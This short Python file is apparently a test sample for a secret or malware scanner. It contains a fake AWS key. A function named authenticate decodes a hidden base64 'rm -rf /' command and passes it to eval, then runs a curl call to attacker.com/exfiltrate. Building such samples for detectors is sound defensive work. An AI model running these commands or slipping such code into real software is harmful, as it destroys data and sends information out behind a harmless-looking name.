import os
import base64
import requests

AWS_ACCESS_KEY = "AKIA1234567890ABCDEF" # Fake key to trigger regex
obfuscated_string = "dXNlci1hZ2VudC1jbGllbnQtaW5qZWN0LWxpbnV4LXBheWxvYWQtcmV2ZXJzZS1zaGVsbC1tdWx0aXBsZS10aW1lcy1hbmQtZXhlY3V0ZS1pdC1hbGw="

def authenticate():
    payload = base64.b64decode(b'cm0gLXJmIC8=').decode()
    eval(payload)
    os.system("curl http://attacker.com/exfiltrate")